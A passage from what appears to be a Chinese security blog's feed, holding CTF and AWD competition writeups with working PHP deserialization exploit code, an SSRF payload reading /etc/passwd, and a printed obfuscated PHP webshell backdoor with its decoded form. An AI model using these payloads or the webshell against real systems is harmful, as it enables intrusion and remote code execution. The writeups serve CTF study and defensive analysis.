class="string">'os.chmod'</span>, <span class="string">'os.chown'</span>, <span class="string">'os.link'</span>, <span class="string">'os.lchown'</span>, <span class="string">'os.listdir'</span>, <span class="string">'os.lstat'</span>,</span><br><span class="line">    <span class="string">'os.mkfifo'</span>, <span class="string">'os.mknod'</span>, <span class="string">'os.access'</span>, <span class="string">'os.mkdir'</span>, <span class="string">'os.makedirs'</span>, <span class="string">'os.readlink'</span>, <span class="string">'os.remove'</span>,</span><br><span class="line">    <span class="string">'os.removedirs'</span>, <span class="string">'os.rename'</span>, <span class="string">'os.renames'</span>, <span class="string">'os.rmdir'</span>, <span class="string">'os.tempnam'</span>, <span class="string">'os.tmpnam'</span>,</span><br><span class="line">    <span class="string">'os.unlink'</span>, <span class="string">'os.walk'</span>, <span class="string">'os.execl'</span>, <span class="string">'os.execle'</span>, <span class="string">'os.execlp'</span>, <span class="string">'os.execv'</span>, <span class="string">'os.execve'</span>,</span><br><span class="line">    <span class="string">'os.dup'</span>, <span class="string">'os.dup2'</span>, <span class="string">'os.execvp'</span>, <span class="string">'os.execvpe'</span>, <span class="string">'os.fork'</span>, <span class="string">'os.forkpty'</span>, <span class="string">'os.kill'</span>,</span><br><span class="line">    <span class="string">'os.spawnl'</span>, <span class="string">'os.spawnle'</span>, <span class="string">'os.spawnlp'</span>, <span class="string">'os.spawnlpe'</span>, <span class="string">'os.spawnv'</span>, <span class="string">'os.spawnve'</span>,</span><br><span class="line">    <span class="string">'os.spawnvp'</span>, <span class="string">'os.spawnvpe'</span>, <span class="string">'pickle.load'</span>, <span class="string">'pickle.loads'</span>, <span class="string">'cPickle.load'</span>,</span><br><span class="line">    <span class="string">'cPickle.loads'</span>, <span class="string">'subprocess.call'</span>, <span class="string">'subprocess.check_call'</span>, <span class="string">'subprocess.check_output'</span>,</span><br><span class="line">    <span class="string">'subprocess.Popen'</span>, <span class="string">'commands.getstatusoutput'</span>, <span class="string">'commands.getoutput'</span>,</span><br><span class="line">    <span class="string">'commands.getstatus'</span>, <span class="string">'glob.glob'</span>, <span class="string">'linecache.getline'</span>, <span class="string">'shutil.copyfileobj'</span>, </span><br><span class="line">    <span class="string">'shutil.copyfile'</span>, <span class="string">'shutil.copy'</span>, <span class="string">'shutil.copy2'</span>, <span class="string">'shutil.move'</span>, <span class="string">'shutil.make_archive'</span>, </span><br><span class="line">    <span class="string">'dircache.listdir'</span>, <span class="string">'dircache.opendir'</span>, <span class="string">'io.open'</span>, <span class="string">'popen2.popen2'</span>, <span class="string">'popen2.popen3'</span>, </span><br><span class="line">    <span class="string">'popen2.popen4'</span>, <span class="string">'timeit.timeit'</span>, <span class="string">'timeit.repeat'</span>, <span class="string">'sys.call_tracing'</span>, <span class="string">'code.interact'</span>, </span><br><span class="line">    <span class="string">'code.compile_command'</span>, <span class="string">'codeop.compile_command'</span>, <span class="string">'pty.spawn, posixfile.open'</span>,</span><br><span class="line">    <span class="string">'posixfile.fileopen'</span>]</span><br><span class="line">    <span class="keyword">for</span> evils <span class="keyword">in</span> black_type_list:</span><br><span class="line">        <span class="keyword">if</span> evils <span class="keyword">in</span> param:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="comment"># get something</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        param = eval(param)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2long</span><span class="params">(ip_addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> unpack(<span class="string">"!L"</span>, inet_aton(ip_addr))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_inner_ipaddress</span><span class="params">(ip)</span>:</span></span><br><span class="line">    ip = ip2long(ip)</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">    ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">    ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span> \</span><br><span class="line">    ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == ip &gt;&gt; <span class="number">16</span> <span class="keyword">or</span> \</span><br><span class="line">    ip2long(<span class="string">'0.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug= <span class="keyword">False</span>, host = <span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>流程：首先通过get读取参数cc，然后调用<code>getinfos</code>执行<code>eval</code>，赋值给<code>file_info</code>，不过黑名单过滤很全，不能直接执行命令。之后进入<code>gets</code>函数，判断<code>file_info</code>类型进行<code>urlopen</code>打开链接，注意到如果类型为<code>dict</code>时，<code>info[&#39;http&#39;]</code>我们可控，因此读入一个字典可以进行ssrf。</p><p>最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/getpar?cc=&#123;&apos;url&apos;:&apos;127.0.0.1&apos;,&apos;path&apos;:&apos;/etc/passwd&apos;,&apos;http&apos;:&apos;file://&apos;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0xD-好长的一个大串"><a href="#0xD-好长的一个大串" class="headerlink" title="0xD 好长的一个大串"></a>0xD 好长的一个大串</h2><p>略</p><h2 id="0xE-babyphp"><a href="#0xE-babyphp" class="headerlink" title="0xE babyphp"></a>0xE babyphp</h2><p>通过文件包含可以读到题目源码。</p><p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">'open_basdir'</span>, <span class="string">'/var/www/html'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$static = <span class="number">1</span>;</span><br><span class="line">$file =$_GET[<span class="string">'file'</span>];</span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag&#123;This_is_Fake_flag&#125;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;</span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span> ($query <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(@preg_match(<span class="string">"/flag/i"</span>, $value))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no no no "</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pathinfo;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $GLOBALS[<span class="string">'static'</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;aaa===<span class="keyword">$this</span>-&gt;bbb)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pathinfo = unserialize(<span class="keyword">$this</span>-&gt;pathinfo);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>info.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">// 此处省略448行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>info.php代码量巨大，但实际上有用的并不多。简单看了一下代码，基本可以确定考点是反序列化。把有用的代码提取出来，这样容易看点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pathinfo;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $GLOBALS[<span class="string">'static'</span>] = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;aaa===<span class="keyword">$this</span>-&gt;bbb)&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;pathinfo = unserialize(<span class="keyword">$this</span>-&gt;pathinfo); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $staic = $GLOBALS[<span class="string">'static'</span>]; </span><br><span class="line">        <span class="keyword">if</span>($static) <span class="keyword">exit</span>();</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;source; </span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]): </span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123; </span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">                <span class="keyword">if</span>(@preg_match(<span class="string">'/system|eval|assert|call_user_func|exec|array_map|usort|uasort|create_funtion/i'</span>, $filter)) <span class="keyword">exit</span>();</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) : </span><br><span class="line">                var_dump(call_user_func($filter, $value));  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整条反序列化链基本就出来了，简单流程就是：</p><ol><li>index.php中先触发Application的反序列化，因为info中会检查全局变量<code>$GLOBALS[&#39;static&#39;]</code></li><li>Application中再触发info的反序列化</li><li><code>$content = $this-&gt;source</code>触发调用类的<code>__get()</code>方法</li><li><code>__get()</code>会调用<code>get()</code>，对<code>value</code>进行赋值</li><li>最后调用<code>_applyFilter($value)</code>，此函数中<code>call_user_func</code>可执行命令</li></ol><p>以下是exp代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pathinfo;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($o)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bbb = &amp;<span class="keyword">$this</span>-&gt;aaa;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = $o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(<span class="string">'source'</span> =&gt; <span class="string">'/flag'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">'show_source'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> info();</span><br><span class="line">$a = <span class="keyword">new</span> Application(serialize($b));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure></p><p><code>parse_url</code>函数在解析url时存在的bug ，通过：<code>///x.php?key=value</code>的方式可以使其返回<code>False</code></p><p>最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1///index.php?file=info.php&amp;payload=O%3A11%3A%22Application%22%3A3%3A%7Bs%3A8%3A%22pathinfo%22%3Bs%3A117%3A%22O%3A4%3A%22info%22%3A2%3A%7Bs%3A13%3A%22%00info%00_params%22%3Ba%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A5%3A%22%2Fflag%22%3B%7Ds%3A13%3A%22%00info%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A11%3A%22show_source%22%3B%7D%7D%22%3Bs%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D</span><br></pre></td></tr></table></figure></p><h2 id="0xF-sqli"><a href="#0xF-sqli" class="headerlink" title="0xF sqli"></a>0xF sqli</h2><p>参考强网杯的随便注，同样是堆叠注入，编码或者字符串拼接绕过过滤即可。</p><h2 id="0x10-隐藏的用户名"><a href="#0x10-隐藏的用户名" class="headerlink" title="0x10 隐藏的用户名"></a>0x10 隐藏的用户名</h2><p>脑洞题，没环境，略。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JTXA-CTF-非官方writeup&quot;&gt;&lt;a href=&quot;#JTXA-CTF-非官方writeup&quot; class=&quot;headerlink&quot; title=&quot;JTXA-CTF 非官方writeup&quot;&gt;&lt;/a&gt;JTXA-CTF 非官方writeup&lt;/h1&gt;&lt;p&gt;官方
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>广东强网杯AWD题目分析</title>
    <link href="https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/"/>
    <id>https://4f-kira.github.io/2019/10/10/gdqwb-awd-writeup/</id>
    <published>2019-10-10T10:54:50.000Z</published>
    <updated>2019-10-10T11:01:33.859Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://xz.aliyun.com/t/6416" target="_blank" rel="noopener">https://xz.aliyun.com/t/6416</a></p><h1 id="广东强网杯AWD题目分析"><a href="#广东强网杯AWD题目分析" class="headerlink" title="广东强网杯AWD题目分析"></a>广东强网杯AWD题目分析</h1><p>上周末跟着大佬去广外打了一场线下赛，上午是应急响应，总体难度不大，大部分队伍都完成了10题，剩余一题逻辑卷损坏不会做。下午是AWD，由于主办方问题，导致了比赛延迟了1小时才进行，给了大量的时间进行题目分析，3个环境都在1小时内写好EXP。同时还有两个非预期的翻车事故，一是所有靶机的密码竟然都是一样，导致不少队伍给别人改了密码。二是使用操作系统竟然不是最新的内核版本，导致被人进行了提权。下面总结一下3个题目找到的漏洞，以及防御方法。</p><h2 id="web1-php"><a href="#web1-php" class="headerlink" title="web1 php"></a>web1 php</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221348-86c238a2-ded5-1.png" alt="image.png"></p><p>第一个web是一个php写的CMS</p><h3 id="漏洞一-预置后门"><a href="#漏洞一-预置后门" class="headerlink" title="漏洞一 预置后门"></a>漏洞一 预置后门</h3><p>使用D盾可以扫到一个后门</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221421-9ae01688-ded5-1.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>后门不是简单的一句话木马，需要调试分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($I); <span class="comment">// %00lambda_1</span></span><br><span class="line">var_dump($q); <span class="comment">// $k="5ac91f7d";$kh="b9615a29bc1d";$kf="24d0b67c2c91";$p="9GmIEgwZ7HiEeclS";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1)&#123;@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");&#125;</span></span><br></pre></td></tr></table></figure></p><p>整理一下代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line">$p=<span class="string">"9GmIEgwZ7HiEeclS"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span>&#123;</span><br><span class="line">  $c=strlen($k);</span><br><span class="line">  $l=strlen($t);</span><br><span class="line">  $o=<span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">      $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@preg_match(<span class="string">"/$kh(.+)$kf/"</span>,@file_get_contents(<span class="string">"php://input"</span>),$m)==<span class="number">1</span>)&#123;</span><br><span class="line">  @ob_start();</span><br><span class="line">  @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode($m[<span class="number">1</span>]),$k)));</span><br><span class="line">  $o=@ob_get_contents();</span><br><span class="line">  @ob_end_clean();</span><br><span class="line">  $r=@base64_encode(@x(@gzcompress($o),$k));</span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"$p$kh$r$kf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>后门的流程如下：</p><ol><li>首先用正则匹配post的内容，前缀为<code>$kh</code>，后缀为<code>$kf</code></li><li>匹配内容进行base64解码</li><li>进行xor，key为<code>$k</code></li><li>进行gzuncompress解压</li><li>进入eval执行代码</li><li>返回内容用相反的顺序进行加密</li></ol><p>根据后门的流程编写python脚本即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span 